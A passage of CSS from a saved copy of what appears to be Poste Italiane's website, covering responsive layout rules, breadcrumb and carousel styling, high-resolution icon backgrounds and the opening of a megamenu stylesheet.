    .panel-cards-services .panel-wrap {
        padding: 20px 60px 45px;
    }
    .panel-cards-bg-promo .panel-wrap {
        padding: 20px 20px 45px 0;
    }
    .panel-cards-services {
        margin-bottom: 30px;
    }
    .panel-cards-xlarge {
        min-height: 474px;
    }
    .panel-cards-xlarge .panel-heading h4 {
        font-size: 44px;
        margin: 20px 0 10px;
    }
    .panel-dashboard .dashboard-wrap .dashboard-subcontent {
        min-height: 40px;
        height: auto;
        width: 100%;
    }
    .panel-cards-opacity {
        min-height: 320px !important;
    }
    /* pills */
    .main-pills.main-pills-bg .main-pills-wrap {
        background-image: none !important;
    }
    .main-pills .main-pills-wrap .scroll-content {
        height: 337px;
    }
    .main-pills .main-pills-wrap .scroll-content.scroll-content-pre-btn {
        height: 292px;
    }
    /* Abstract */
    .content-abstract {
        padding: 20px 0 40px;
    }
    .content-abstract .abstract {
        padding: 20px 0 15px;
    }
    .content-abstract .abstract-heading {
        text-align: center;
    }
    .content-abstract .welcome .abstract {
        padding: 0px;
    }
    .welcome .abstract-heading {
        text-align: left;
    }
    .welcome-simple .abstract-heading {
        text-align: center;
    }
    /* BreadCrumb type a - Trim totale */
    .breadcrumb.breadcrumb-sm-trim-a li + li:not(:last-child) span[name="trim"] {
        text-indent: -9999px;
        padding: 0;
        vertical-align: middle;
        width: 100%;
        height: 100%;
        position: absolute;
        top: 0;
        left: 10px;
        display: block;
        z-index: 2;
    }
    .breadcrumb.breadcrumb-sm-trim-a li + li:not(:last-child):after {
        content: "...";
    }
    .breadcrumb.breadcrumb-sm-trim-a li + li:not(:last-child):hover:after {
        content: "";
    }
    .breadcrumb.breadcrumb-sm-trim-a li + li:not(:last-child):hover span[name="trim"] {
        text-indent: 0px;
        position: relative;
        left: auto;
    }
    /* BreadCrumb type b - Trim su larghezza (controllo presenza span escludendo l'ultimo elemento) */
    .breadcrumb.breadcrumb-sm-trim-b li + li:not(:last-child) span[name="trim"] {
        display: inline-block;
        padding: 0;
        vertical-align: middle;
        max-width: 60px;
        white-space: nowrap;
        overflow: hidden;
        text-overflow: ellipsis;
    }
    .breadcrumb.breadcrumb-sm-trim-b li + li:not(:last-child) span[name="trim"]:hover {
        max-width: none;
    }
    /*carousel-a1*/
    .carousel-a1 .item {
        /*height: 515px;*/
        height: 430px;
    }
    .carousel-a1 .carousel-text .carousel-text-wrap {
        height: 360px;
    }
    .carousel-a1 .carousel-text.carousel-text-small .carousel-text-wrap .carousel-text-heading {
        font-size: 36px;
        line-height: 1.0;
    }
    .carousel-a1 .carousel-text.carousel-text-small .carousel-text-wrap p {
        font-size: 18px;
    }
    .carousel-a1 .banner-advice {
        bottom: -28px;
    }
    /* carousel d */
    .carousel-d .item {
        background-position: center right;
    }
    /*
    .carousel-d .carousel-text .carousel-text-wrap {
        text-align: center;
    }
    .carousel-d .carousel-overlay {
        background-image: url(/risorse_dt/condivise/immagini/generiche/pixel-040.png);
    }
    */
    .content-page-anchors-fixed {
        top: 0;
    }
    /*modal*/
    .modal-fullpage button.close {
        right: 2%;
    }
    /* searchbar */
    .container-box-search .input-search {
        font-size: 18px;
    }
    /* icon scroll */
    .icon-scroll {
        display: none;
    }
    /*list*/
    .list-file-detailed li{
      background-position: left 30px;
    }
}


/*md*/

@media (min-width: 992px) and (max-width: 1199px) {
    .ellipsis-md {
        white-space: nowrap;
        text-overflow: ellipsis;
        overflow: hidden;
    }
    .ellipsis-md-not {
        white-space: normal;
        text-overflow: inherit;
        overflow: inherit;
    }
    .equalize-height-md-not {
        height: auto !important;
        min-height: auto !important;
    }
    .equalize-height-md-not {
        height: auto !important;
        min-height: auto !important;
    }
    .need-area {
        padding: 0 15px;
    }
    .content-overflow.content-overflow-visible-md {
        overflow-x: auto;
    }
    .content-federation-bar-minified .logo,
    .content-federation-bar-simplified .logo {
        height: 49px;
        line-height: 54px;
    }
    /* Panel */
    .panel-detailed-cards .price-value {
        font-size: 48px;
    }
    .abstract-advantage .panel-detailed-cards .price-value {
        font-size: 44px;
    }
    .abstract-advantage .advantage-detail-spec .level-spec {
        font-size: 18px;
        font-weight: 500;
    }
    .abstract-advantage .panel-detailed-cards .price-subvalue {
        font-size: 20px;
    }
    .panel-detailed-cards-bg {
        background-position: top 92px left 22px;
    }
    .panel-detailed-cards .price-currency {
        font-size: 18px;
        line-height: 36px;
        letter-spacing: 3px;
    }
    .panel-detailed-cards .price-subvalue {
        font-size: 20px;
    }
    .panel-cards.panel-cards-bg-double {
        background-position: top left -100%;
    }
    .panel-detailed-cards .panel-wrap,
    .panel-detailed-cards-bg .panel-wrap {
        padding: 40px 20px;
    }
    .panel-cards-xlarge {
        min-height: 474px;
    }
    .panel-cards-xlarge .panel-wrap-pre {
        height: 250px;
    }
    /* BreadCrumb type a - Trim totale */
    .breadcrumb.breadcrumb-md-trim-a li + li:not(:last-child) span[name="trim"] {
        text-indent: -9999px;
        padding: 0;
        vertical-align: middle;
        width: 100%;
        height: 100%;
        position: absolute;
        top: 0;
        left: 10px;
        display: block;
        z-index: 2;
    }
    .breadcrumb.breadcrumb-md-trim-a li + li:not(:last-child):after {
        content: "...";
    }
    .breadcrumb.breadcrumb-md-trim-a li + li:not(:last-child):hover:after {
        content: "";
    }
    .breadcrumb.breadcrumb-md-trim-a li + li:not(:last-child):hover span[name="trim"] {
        text-indent: 0px;
        position: relative;
        left: auto;
    }
    /* BreadCrumb type b - Trim su larghezza (controllo presenza span escludendo l'ultimo elemento) */
    .breadcrumb.breadcrumb-md-trim-b li + li:not(:last-child) span[name="trim"] {
        display: inline-block;
        padding: 0;
        vertical-align: middle;
        max-width: 60px;
        white-space: nowrap;
        overflow: hidden;
        text-overflow: ellipsis;
    }
    .breadcrumb.breadcrumb-md-trim-b li + li:not(:last-child) span[name="trim"]:hover {
        max-width: none;
    }
    /* carousel d */
    .carousel-d .item {
        background-position: center right 200px;
    }
    /* pills */
    .main-pills.main-pills-bg .main-pills-wrap {
        /*background-position: right -44px center;*/
        background-position: right -166px center;
    }

    .main-pills .main-pills-wrap .scroll-content {
        height: 337px;
    }
    .main-pills .main-pills-wrap .scroll-content.scroll-content-pre-btn {
        height: 278px;
    }
    /* Blocktab (es. subhome-pvita) */
    /* con spalle (default) */
    .blocktab-container ul li {
        width: 151px;
    }
    .blocktab-container ul.blocktab-5 li,
    .blocktab-container ul.blocktab-5 li a span.blocktab-maininfo {
        width: 123px;
    }

    /* gestione parole troppo lunghe sui tab */
    .blocktab-reduced-font .blocktab-container ul.blocktab-5 li a span.blocktab-maininfo {
        padding-left: 5px !important;
        padding-right: 5px !important;
    }
    /* senza spalla */
    .nobracket .blocktab-container ul li {
        width: 164px;
    }
    .nobracket .blocktab-container ul.blocktab-5 li,
    .nobracket .blocktab-container ul.blocktab-5 li a span.blocktab-maininfo {
        width: 164px;
    }
    .nobracket .blocktab-container ul.blocktab-6 li,
    .nobracket .blocktab-container ul.blocktab-6 li a span.blocktab-maininfo {
        width: 140px;
    }
    .nobracket .blocktab-container ul.blocktab-7 li,
    .nobracket .blocktab-container ul.blocktab-7 li a span.blocktab-maininfo {
        width: 117px;
    }
    .blocktab-container ul.blocktab-5 li {
        margin: 0 10px;
    }
    .nobracket .blocktab-container ul.blocktab-5 li {
        margin: 0 15px;
    }
    .blocktab-container ul.blocktab-6 li {
        margin: 0 10px;
    }
    .blocktab-container ul.blocktab-7 li {
        margin: 0 10px;
    }
    /* Footer*/
    .content-footer-post .base-footer {
        text-align: right;
    }
}


/*lg*/

@media (min-width: 1200px) {
    .ellipsis-lg {
        white-space: nowrap;
        text-overflow: ellipsis;
        overflow: hidden;
    }
    .ellipsis-lg-not {
        white-space: normal;
        text-overflow: inherit;
        overflow: inherit;
    }
    .equalize-height-lg-not {
        height: auto !important;
        min-height: auto !important;
    }
    .content-overflow.content-overflow-visible-lg {
        overflow-x: auto;
    }
    .content-federation-bar-minified .logo,
    .content-federation-bar-simplified .logo {
        height: 49px;
        line-height: 54px;
    }
    .abstract-advantage .panel-detailed-cards .panel-wrap,
    .abstract-advantage .panel-detailed-cards-bg .panel-wrap {
        padding: 40px 20px;
    }
    /* Estensione oltre griglia max */
    .container-extended {
        width: auto;
        max-width: 1350px;
    }

    /* body */
    #main {
        padding-right: 68px;
    }
    #main-dx {
        padding-left: 68px;
    }
    /* Spalla */
    #main.nobracket,
    .nobracket #main {
        padding-right: 0px !important;
    }
    #main-dx.nobracket,
    .nobracket #main-dx {
        padding-left: 0px !important;
    }
    /* carousel d */
    .carousel-d .item {
        background-position: center right 200px;
    }
    /* footer */
    .content-footer-post .base-footer {
        text-align: right;
    }
}


/* High res Display  */

@media only screen and (-webkit-min-device-pixel-ratio: 2),
only screen and (min-resolution: 192dpi) {
    /* Barra federata */
    .content-federation-bar .federation-bar-wrap a.dropdown-toggle-assistenza,
    .content-header a.dropdown-toggle-assistenza {
        background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-default-on-2x/ico-assistenza-domande-frequenti@2x.png*/ url();
    }
    .content-federation-bar .federation-bar-wrap a.dropdown-toggle-login,
    .content-header a.dropdown-toggle-login {
        background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-default-on-2x/ico-area-personale@2x.png*/ url();
    }
    /* Submenu pagina bisogni */
    .submenu-need .submenu-need-scroller .scroller-need-spedire a {
        background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-bisogni-greydouble-2x/ico-spedire@2x.png*/ url();
    }
    .submenu-need .submenu-need-scroller .scroller-need-creare a {
        background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-bisogni-greydouble-2x/ico-creare-pensione@2x.png*/ url();
    }
    .submenu-need .submenu-need-scroller .scroller-need-finanziare a {
        background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-bisogni-greydouble-2x/ico-finanziare-progetti@2x.png*/ url();
    }
    .submenu-need .submenu-need-scroller .scroller-need-gestire a {
        background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-bisogni-greydouble-2x/ico-gestire-il-denaro@2x.png*/ url();
    }
    .submenu-need .submenu-need-scroller .scroller-need-proteggere a {
        background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-bisogni-greydouble-2x/ico-proteggerti-dagli-imprevisti@2x.png*/ url();
    }
    .submenu-need .submenu-need-scroller .scroller-need-risparmiare a {
        background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-bisogni-greydouble-2x/ico-risparmio-postale-risparmiare-investire@2x.png*/ url();
    }
    .submenu-need .submenu-need-scroller .scroller-need-spedire.active-element a {
        background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-bisogni-bluedouble-2x/ico-spedisci-online-spedisci@2x.png*/ url();
    }
    .submenu-need .submenu-need-scroller .scroller-need-creare.active-element a {
        background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-bisogni-bluedouble-2x/ico-creare-pensione@2x.png*/ url();
    }
    .submenu-need .submenu-need-scroller .scroller-need-finanziare.active-element a {
        background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-bisogni-bluedouble-2x/ico-finanziare-progetti@2x.png*/ url();
    }
    .submenu-need .submenu-need-scroller .scroller-need-gestire.active-element a {
        background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-bisogni-bluedouble-2x/ico-gestire-il-denaro@2x.png*/ url();
    }
    .submenu-need .submenu-need-scroller .scroller-need-proteggere.active-element a {
        background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-bisogni-bluedouble-2x/ico-proteggerti-dagli-imprevisti@2x.png*/ url();
    }
    .submenu-need .submenu-need-scroller .scroller-need-risparmiare.active-element a {
        background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-bisogni-bluedouble-2x/ico-risparmio-postale-risparmiare-investire@2x.png*/ url();
    }
    /* arrow */
    .panel-cards .panel-link .btn-card span,
    .need .need-btn span,
    .need-scroller-slick-wrap .need .need-btn span,
    .myservices-area .myservices a,
    .list-segments li,
    .default-arrow-right,
    .vertical-nav-tabs-left > li.active > a span,
    .vertical-nav-tabs-left > li.active > a:hover span,
    .vertical-nav-tabs-left > li.active > a:focus span {
        background-image: /*savepage-url=/risorse_dt/condivise/immagini/generiche/ico-arrow-grey-right@2x.png*/ url();
    }
    .vertical-nav-tabs-right > li.active > a span,
    .vertical-nav-tabs-right > li.active > a:hover span,
    .vertical-nav-tabs-right > li.active > a:focus span {
        background-image: /*savepage-url=/risorse_dt/condivise/immagini/generiche/ico-arrow-grey-left@2x.png*/ url();
    }
    .panel-cards-edge .panel-link .btn-card span {
        background-image: none;
    }
    /* btn cta */
    .btn-cta {
        background-size: 24px;
    }
    .btn-cta-support-scrivici,
    .btn-cta-support-scrivici:active {
        background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-default-on-2x/ico-scrivici@2x.png*/ url();
    }
    .btn-cta-support-chiamaci,
    .btn-cta-support-chiamaci:active {
        background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-default-on-2x/ico-chiamaci@2x.png*/ url();
    }
    .btn-cta-support-vieniatrovarci,
    .btn-cta-support-vieniatrovarci:active {
        background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-default-on-2x/ico-vieni-in-poste-cerca-up@2x.png*/ url();
    }
    .btn-cta-cerca,
    .btn-cta-cerca:active {
        background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-default-on-2x/ico-cerca@2x.png*/ url();
    }
    .btn-cta-upload,
    .btn-cta-upload:active {
        background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-default-on-2x/ico-upload@2x.png*/ url();
    }
    .btn-cta-elimina,
    .btn-cta-elimina:active {
        background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-default-on-2x/ico-cestino@2x.png*/ url();
    }
    .btn-cta-filtra,
    .btn-cta-filtra:active {
        background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-default-on-2x/ico-filtro@2x.png*/ url();
    }
    /* Icone */
    .list-check li {
        background-image: /*savepage-url=/risorse_dt/condivise/immagini/generiche/list-check@2x.png*/ url();
    }
    .steps > li .step-content span.step-number {
        background-image: /*savepage-url=/risorse_dt/condivise/immagini/generiche/list-step@2x.png*/ url();
    }
    .steps > li.active .step-content span.step-number,
    .steps > li.passed .step-content span.step-number {
        background-image: /*savepage-url=/risorse_dt/condivise/immagini/generiche/list-step-active@2x.png*/ url();
    }
    .tag-remove, .file-remove {
        background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-default-on-2x/ico-annulla@2x.png*/ url();
    }
    .file-remove:hover{
       background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-default-blue-2x/ico-annulla@2x.png*/ url();
    }
    .back-to-top {
        background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-default-on-2x/ico-freccia-up@2x.png*/ url();
    }
    /* Icone Documentazione */
    .list-file li {
        background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-list-file-on-2x/list-file@2x.png*/ url();
    }
    li.list-file-pdf {
        background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-list-file-on-2x/list-file-pdf@2x.png*/ url();
    }
    li.list-file-doc {
        background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-list-file-on-2x/list-file-doc@2x.png*/ url();
    }
    li.list-file-zip {
        background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-list-file-on-2x/list-file-zip@2x.png*/ url();
    }
    li.list-file-xls {
        background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-list-file-on-2x/list-file-xls@2x.png*/ url();
    }
    li.list-file-txt {
        background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-list-file-on-2x/list-file-txt@2x.png*/ url();
    }
    li.list-file-ppt {
        background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-list-file-on-2x/list-file-ppt@2x.png*/ url();
    }
    li.list-file-img {
        background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-list-file-on-2x/list-file-img@2x.png*/ url();
    }
    li.list-file-xml {
        background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-list-file-on-2x/list-file-xml@2x.png*/ url();
    }
    li.list-file-yt {
        background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-list-file-on-2x/list-file-yt@2x.png*/ url();
    }
    li.list-file-mp4 {
        background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-list-file-on-2x/list-file-mp4@2x.png*/ url();
    }
    li.list-file-link {
        background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-list-file-on-2x/list-file-link@2x.png*/ url();
    }
    /* esiti applicativi */
    .main-result-success .main-result-wrap .result-heading {
        background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/ico-result-success@2x.png*/ url();
    }
    .main-result-error .main-result-wrap .result-heading {
        background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/ico-result-error@2x.png*/ url();
    }
    .main-messages-info .main-messages-wrap {
        background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/ico-messages-info@2x.png*/ url();
    }
    .main-messages-warning .main-messages-wrap {
        background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/ico-messages-warning@2x.png*/ url();
    }
    .main-messages-error .main-messages-wrap {
        background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/ico-messages-error@2x.png*/ url();
    }
    .main-messages-success .main-messages-wrap {
        background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/ico-messages-success@2x.png*/ url();
    }
    /* altre icone */
    .applfunction.applfunction-download > a {
        background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-default-on-2x/ico-downloadpay@2x.png*/ url();
    }
    .applfunction.applfunction-print > a {
        background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-default-on-2x/ico-stampa@2x.png*/ url();
    }
    .applfunction.applfunction-delete > a {
        background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-default-on-2x/ico-cestino@2x.png*/ url();
    }
    .applfunction.applfunction-share > a {
        background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-default-on-2x/ico-share@2x.png*/ url();
    }
    .applfunction.applfunction-link > a {
        background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-default-on-2x/ico-ancora@2x.png*/ url();
    }
    .applfunction.applfunction-visualizza > a {
        background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-default-on-2x/ico-documento-generico@2x.png*/ url();
    }
    .applfunction.applfunction-file-pdf > a {
        background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-list-file-on-2x/list-file-pdf@2x.png*/ url();
    }
    .applfunction.applfunction-file-zip > a {
        background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-list-file-on-2x/list-file-zip@2x.png*/ url();
    }
    .applfunction.applfunction-file-xls > a {
        background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-list-file-on-2x/list-file-xls@2x.png*/ url();
    }
    .applfunction.applfunction-file-doc > a {
        background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-list-file-on-2x/list-file-doc@2x.png*/ url();
    }
    .applfunction.applfunction-file-img > a {
        background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-list-file-on-2x/list-file-img@2x.png*/ url();
    }
    .applfunction.applfunction-file-img > a {
        background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-list-file-on-2x/list-file-ppt@2x.png*/ url();
    }
    .other a {
        background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-tonde-16-blue-2x/ico-freccia-blu@2x.png*/ url();
    }
    .show-other a {
        background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-tonde-16-blue-2x/ico-piu-blu@2x.png*/ url();
    }
    .main-pills.main-pills-bg-pattern-01 {
        background-image: /*savepage-url=/risorse_dt/condivise/immagini/generiche/chart-bg-01@2x.png*/ url();
    }
    .tag-remove, .file-remove {
        background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-default-on-2x/ico-annulla@2x.png*/ url();
    }
    .file-remove:hover{
      background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-default-blue-2x/ico-annulla@2x.png*/ url();
    }
    .tag-element-heavenly .tag-remove {
        background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-default-blue-2x/ico-annulla@2x.png*/ url();
    }
    /*
    .thumb-video:after {
        background-image: url(/risorse_dt/condivise/immagini/icone/ico-play@2x.png);
    }
    */
}


/* Browser webkit */

::-webkit-scrollbar {
    -webkit-appearance: none;
    width: 7px;
}

::-webkit-scrollbar-thumb {
    border-radius: 4px;
    background-color: rgba(0, 0, 0, .5);
    -webkit-box-shadow: 0 0 1px rgba(255, 255, 255, .5);
}


/* Browser ie9 */

.pi-ie9 .video-wrap {
    background-color: transparent;
}

.pi-ie9 .carousel-a1 .item video {
    top: -50%;
}


/* Browser ie8 */

.pi-ie8 .video-wrap {
    display: none;
}

@-webkit-keyframes animatedBackgroundPatternX {
    from {
        background-position: bottom right;
    }
    to {
        background-position: bottom left;
    }
}

@keyframes animatedBackgroundPatternX {
    from {
        background-position: bottom right;
    }
    to {
        background-position: bottom left;
    }
}

@-webkit-keyframes iconscrollanimation {
    0% {
        opacity: 1;
    }
    100% {
        opacity: 0;
        -webkit-transform: translateY(46px);
        transform: translateY(46px);
    }
}

@keyframes iconscrollanimation {
    0% {
        opacity: 1;
    }
    100% {
        opacity: 0;
        -webkit-transform: translateY(46px);
        transform: translateY(46px);
    }
}

/*
@import url(/risorse_dt/condivise/stili/trasversali/events.css);
*/
</style>
			
			
			
		
			
			
				<style data-savepage-href="/risorse_dt/condivise/stili/trasversali/megamenu-pi.css" type="text/css">/*****************************************************

    Foglio stile base - (c) Poste Italiane 2017 - GD//FS//DU

*****************************************************/


/*
/*  base bg  : #ececec (grigio scuro)
/*  base bg  : #f6f6f6 (grigio chiaro)
/*  base bg  : #ffffff (bianco)
/*  base bg  : #d9e4f5 (celeste)
/*  testo : #222427 (grigio scuro)
/*  testo : #4a4a4a (grigio medio-scuro)
/*  testo : #787878 (grigio medio-chiaro)
/*  testo : #d0d0d0 (grigio chiaro)
/*  testo : #fff
/*  testo : #0047bb
/*  testo : #00328e
/*  btn : #eedc00 (giallo base)
/*  btn : #ffec00 (giallo hover)
/*  btn : #222427 (grigio)
/*  warning color   : #ffb906
/*  error color     : #ff3636
/*  success color   : #26b158
/*  info color      : #0047bb
/*  */

.clear {
    clear: both;
}

.show {
    display: block!important;
}

.navbar-default {
    margin: 0;
    background-color: transparent;
    border: none;
}

.navbar-collapse {
    padding-left: 0;
    padding-right: 0;
}

#header-poste-italiane {
    clear: both;
    text-align: left;
    margin: 0 auto;
    position: relative;
    z-index: 1042;
}

#header-poste-italiane .navbar-logo {
    display: block;
    float: left;
}

#header-poste-italiane .navbar-mysite-main {
    padding: 15px 30px;
    margin-left: -15px;
    margin-right: -15px;
}

#header-poste-italiane .navbar-mysite-list-wrap {
    padding: 0px 30px;
    margin-left: -15px;
    margin-right: -15px;
}

#header-poste-italiane .navbar-mysite-main a.navbar-mysite-choose {
    text-transform: uppercase;
    font-size: 15px;
    font-weight: bold;
}

#header-poste-italiane .navbar-mysite-list {
    border-top: 1px solid #ccc;
}

#header-poste-italiane .navbar-mysite-list a {
    text-transform: uppercase;
    font-size: 15px;
    font-weight: bold;
    color: #222427;
}

#header-poste-italiane .navbar-mysite-list li {
    line-height: 46px;
    border-bottom: 1px solid #ccc;
}

#header-poste-italiane .navbar-mysite-list li:last-child {
    border: none;
}

#header-poste-italiane .navbar-mysite-list.navbar-mysite-list-special {
    border: none;
}

#header-poste-italiane .navbar-mysite-list.navbar-mysite-list-special li {
    background-color: #ececec;
    line-height: 46px;
    margin-left: -30px;
    margin-right: -30px;
    padding-left: 30px;
    padding-right: 30px;
}

#header-poste-italiane .menu-ul {
    display: block;
    float: left;
    margin-right: 10px;
    margin-left: 30px;
}

#header-poste-italiane .nav-col-left.navbar-search {
    display: block;
    float: left;
}

#header-poste-italiane .nav-col-right .navbar-search {
    display: none;
}

#header-poste-italiane .navbar-logo,
#header-poste-italiane .navbar-search {
    line-height: 66px;
    /* 70-4 = content-federation-bar {border} */
}

#header-poste-italiane .navbar-logo {
    margin-right: 10px;
}

#header-poste-italiane .navbar-search {
    float: left;
}

#header-poste-italiane .navbar-search a,
#header-poste-italiane .navbar-search a span {
    margin: 0;
    outline: none;
    box-shadow: none;
}

#header-poste-italiane ul {
    padding: 0;
    list-style: none;
    margin: 0;
}

#header-poste-italiane ul li {
    float: left;
}

#header-poste-italiane ul li a:hover {
    text-decoration: none;
}

#header-poste-italiane ul li.pi-servizio {
    background-color: transparent;
    margin: 0 17px;
    border-bottom: 4px solid transparent;
}

#header-poste-italiane ul li.pi-servizio-active,
#header-poste-italiane ul li.pi-servizio:hover {
    border-bottom-color: #0047bb;
}

#header-poste-italiane ul li.pi-servizio a.first-level {
    height: 66px;
    display: table-cell;
    vertical-align: middle;
    text-transform: uppercase;
    font-size: 15px;
    color: #222427;
    font-weight: 500;
    outline: none;
}

#header-poste-italiane ul li.pi-servizio-active a.first-level {
    font-weight: bold;
    color: #0047bb;
    text-decoration: none;
}

#header-poste-italiane ul li.pi-servizio:hover a.first-level {
    color: #0047bb;
}

#header-poste-italiane ul li#pi-servizionline.pi-servizio {
    background-color: #ffec00;
    padding: 0px 20px 0;
    margin-right: 0;
    margin-top: 0px;
    height: 70px;
}

#header-poste-italiane ul li#pi-servizionline.pi-servizio {
    font-weight: bold;
}


/*
#header-poste-italiane ul li#pi-servizionline.pi-servizio:hover {
    border-bottom-color: transparent;
}
*/

#header-poste-italiane div.navigation-submenu {
    background: #fff;
    border-bottom: 1px solid #d0d0d0;
    padding: 0;
    position: absolute;
    top: 0px;
    left: 0;
    width: 100%;
    text-align: left;
}

#header-poste-italiane div.navigation-submenu .navigation-submenu-container-mainrow h3,
#header-poste-italiane div.navbar-clonewrap h3,
#header-poste-italiane div.navigation-submenu .navigation-submenu-container-mainrow h3 a,
#header-poste-italiane div.navbar-clonewrap h3 a {
    color: #222427;
}

#header-poste-italiane div.navigation-submenu .navigation-submenu-container-mainrow ul,
#header-poste-italiane div.navbar-clonewrap ul {
    padding-bottom: 15px;
    margin-left: -15px;
    margin-right: -15px;
}

#header-poste-italiane div.navigation-submenu .navigation-submenu-container-mainrow ul li a,
#header-poste-italiane div.navbar-clonewrap ul li a {
    font-weight: 200;
    color: #4a4a4a;
    display: block;
    vertical-align: middle;
    padding: 6px 15px;
    width: 100%;
}

#header-poste-italiane div.navigation-submenu .navigation-submenu-container-mainrow ul li a:hover,
#header-poste-italiane div.navbar-clonewrap ul li a:hover {
    font-weight: 400;
    background-color: #ececec;
    color: #0047bb;
}

#header-poste-italiane div.navigation-submenu .navigation-submenu-container-mainrow h3 small,
#header-poste-italiane div.navbar-clonewrap h3 small {
    -webkit-transition: opacity 1.3s linear;
    -o-transition: opacity 1.3s linear;
    -moz-transition: opacity 1.3s linear;
    -ms-transition: opacity 1.3s linear;
    -kthtml-transition: opacity 1.3s linear;
    transition: opacity 1.3s linear;
    opacity: 0;
}

#header-poste-italiane div.navigation-submenu .navigation-submenu-container-mainrow h3:hover small,
#header-poste-italiane div.navbar-clonewrap h3:hover small {
    -webkit-transition: opacity 0.2s linear;
    -o-transition: opacity 0.2s linear;
    -moz-transition: opacity 0.2s linear;
    -ms-transition: opacity 0.2s linear;
    -kthtml-transition: opacity 0.2s linear;
    transition: opacity 0.2s linear;
    opacity: 1;
}

#header-poste-italiane div.navigation-submenu .navigation-submenu-container-mainrow .col-mainrow {
    padding-top: 20px;
    padding-bottom: 15px;
    -webkit-transition: all 1.2s linear;
    -o-transition: all 1.2s linear;
    -moz-transition: all 1.2s linear;
    -ms-transition: all 1.2s linear;
    -kthtml-transition: all 1.2s linear;
    transition: all 1.2s linear;
}

#header-poste-italiane div.navigation-submenu .navigation-submenu-container-mainrow .col-mainrow:hover {
    background-color: #fbfbfb;
}

#header-poste-italiane div.navigation-submenu .navigation-submenu-container-subrow {
    background-color: #f6f6f6;
    height: 60px;
    padding: 15px 0;
    line-height: 30px;
}

#header-poste-italiane div.navigation-submenu .navigation-submenu-container-subrow ul li {
    margin-right: 30px;
}

#header-poste-italiane div.navigation-submenu .navigation-submenu-container-subrow ul li a {
    color: #4a4a4a;
    text-transform: uppercase;
}

#header-poste-italiane div.navigation-submenu .navigation-submenu-container-subrow ul li a:hover {
    color: #0047bb;
}

#header-poste-italiane div.navigation-submenu .navigation-submenu-container-mainrow .col-mainrow.col-mainrow-nohover:hover,
#header-poste-italiane div.navigation-submenu .navigation-submenu-container-mainrow .col-mainrow.col-mainrow-nohover:hover a {
    color: #222427;
    background-color: transparent;
}

#header-poste-italiane div.navigation-submenu {
    display: none;
}

#header-poste-italiane div.navigation-submenu-active {
    display: block;
}

#header-poste-italiane div.navigation-submenu li {
    float: none;
    position: relative;
}


/*
#header-poste-italiane ul li.pi-servizio:hover > div.navigation-submenu {
    display: block;
}

#header-poste-italiane ul li.pi-servizio.nohover:hover > div.navigation-submenu {
    display: none;
}
*/

.area-ico a {
    background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-default-on/ico-ancora.png*/ url();
    background-repeat: no-repeat;
    background-position: center left 15px;
    background-size: 20px;
    padding-left: 45px!important;
}

.hover-more {
    font-size: 12px!important;
}


/*debug end*/

@media (max-width: 767px) {
    .navbar-default {
        /*
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        */
    }
    .navbar-default .navbar-toggle {
        margin-top: 5px;
        margin-bottom: 5px;
        border: none;
        height: 34px;
